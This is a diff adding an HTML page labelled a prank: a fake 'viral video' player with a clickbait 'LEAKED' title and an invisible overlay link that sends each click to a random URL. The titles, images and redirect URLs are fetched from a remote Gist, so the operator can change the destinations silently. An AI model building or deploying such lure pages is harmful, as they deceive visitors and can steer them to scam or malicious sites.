@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Viral Video - Watch Now</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body
+    class="bg-black text-white h-screen flex flex-col items-center justify-center overflow-hidden font-sans p-4"
+  >
+    <!-- Title on top of video -->
+    <div
+      id="video-title-container"
+      class="mb-6 text-center w-full max-w-4xl opacity-0 transition-opacity duration-500"
+    >
+      <h1
+        id="video-title-text"
+        class="text-xl sm:text-2xl md:text-3xl font-bold leading-tight break-words"
+      >
+        Loading...
+      </h1>
+    </div>
+
+    <!-- Fake Video Player Container -->
+    <div
+      class="relative w-full max-w-4xl aspect-video bg-zinc-900 border border-zinc-800 shadow-2xl rounded-lg overflow-hidden group"
+    >
+      <!-- Video Preview Background (Blurred/Mosaic) -->
+      <div
+        id="video-preview"
+        class="absolute inset-0 bg-cover bg-center blur-md scale-110 opacity-60 transition-all duration-700"
+      ></div>
+
+      <!-- Redirection Layer (Invisible Trigger) -->
+      <a
+        id="prank-trigger"
+        href="#"
+        target="_blank"
+        class="absolute inset-0 z-50 cursor-pointer"
+      ></a>
+
+      <!-- Loading State Overlay -->
+      <div
+        id="loading-overlay"
+        class="absolute inset-0 flex flex-col items-center justify-center bg-black z-40 transition-opacity duration-500"
+      >
+        <div
+          class="w-12 h-12 border-4 border-zinc-700 border-t-red-600 rounded-full animate-spin mb-4"
+        ></div>
+        <p
+          class="text-zinc-500 animate-pulse uppercase tracking-widest text-[10px] sm:text-xs"
+        >
+          Loading Video...
+        </p>
+      </div>
+
+      <!-- Fake Player Interface -->
+      <div
+        id="player-interface"
+        class="absolute inset-0 flex flex-col opacity-0 transition-opacity duration-700"
+      >
+        <!-- Play Button -->
+        <div class="flex-grow flex items-center justify-center">
+          <div
+            class="w-16 h-16 sm:w-20 sm:h-20 bg-white/10 rounded-full flex items-center justify-center backdrop-blur-sm group-hover:bg-white/20 transition-all transform group-hover:scale-110 border border-white/20"
+          >
+            <svg
+              class="w-8 h-8 sm:w-10 sm:h-10 text-white ml-1"
+              fill="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path d="M8 5v14l11-7z" />
+            </svg>
+          </div>
+        </div>
+
+        <!-- Fake Controls -->
+        <div
+          class="bg-gradient-to-t from-black/90 to-transparent p-3 sm:p-4 flex flex-col gap-2"
+        >
+          <div class="w-full bg-zinc-600/50 h-1 rounded-full overflow-hidden">
+            <div class="bg-red-600 h-full w-[1%]" id="fake-progress"></div>
+          </div>
+
+          <div class="flex items-center justify-between text-zinc-300">
+            <div class="flex items-center gap-3 sm:gap-4">
+              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7z" />
+              </svg>
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M7 7h10v10H7z" />
+              </svg>
+              <span class="text-[10px] sm:text-xs font-mono"
+                >00:00 / 08:42</span
+              >
+            </div>
+            <div class="flex items-center gap-3 sm:gap-4">
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                <path
+                  d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"
+                />
+              </svg>
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                <path
+                  d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"
+                />
+              </svg>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Subtext -->
+    <p class="mt-8 text-zinc-600 text-xs text-center px-4">
+      Click to play high quality video (HD).
+    </p>
+
+    <script>
+      window.addEventListener("DOMContentLoaded", () => {
+        const loadingOverlay = document.getElementById("loading-overlay");
+        const playerInterface = document.getElementById("player-interface");
+        const videoTitleContainer = document.getElementById(
+          "video-title-container"
+        );
+        const videoTitleText = document.getElementById("video-title-text");
+        const videoPreview = document.getElementById("video-preview");
+        const prankTrigger = document.getElementById("prank-trigger");
+
+        // Default fallback data
+        let videoData = [
+          {
+            title: "LEAKED: What they didn't want you to see!",
+            pic: "https://images.unsplash.com/photo-1506157786151-b8491531f063?auto=format&fit=crop&q=80&w=1000",
+            redirectUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+          },
+        ];
+
+        let selectedVideo = videoData[0];
+
+        // Fetch data from the updated Gist
+        fetch(
+          "https://gist.githubusercontent.com/sharinggitblog/397eb9e437b4765f97e48fc8d7fd1b0f/raw/"
+        )
+          .then((response) => response.json())
+          .then((json) => {
+            if (json.data && json.data.length > 0) {
+              videoData = json.data;
+              // Pick a random video for the initial load
+              selectedVideo =
+                videoData[Math.floor(Math.random() * videoData.length)];
+
+              // Update UI
+              videoTitleText.innerText = selectedVideo.title;
+              videoPreview.style.backgroundImage = `url('${selectedVideo.pic}')`;
+              prankTrigger.href = selectedVideo.redirectUrl;
+              console.log("Remote data loaded");
+            }
+          })
+          .catch((err) => {
+            console.warn("Using local fallback:", err);
+            videoTitleText.innerText = selectedVideo.title;
+            videoPreview.style.backgroundImage = `url('${selectedVideo.pic}')`;
+            prankTrigger.href = selectedVideo.redirectUrl;
+          });
+
+        // Randomize redirect every time the user clicks
+        prankTrigger.addEventListener("click", () => {
+          const randomItem =
+            videoData[Math.floor(Math.random() * videoData.length)];
+          prankTrigger.href = randomItem.redirectUrl;
+        });
+
+        // Loading sequence simulation
+        setTimeout(() => {
+          loadingOverlay.classList.add("opacity-0");
+          setTimeout(() => {
+            loadingOverlay.style.display = "none";
+            playerInterface.classList.remove("opacity-0");
+            videoTitleContainer.classList.remove("opacity-0");
+          }, 500);
+        }, 3000);
+      });
+    </script>
+  </body>
+</html>
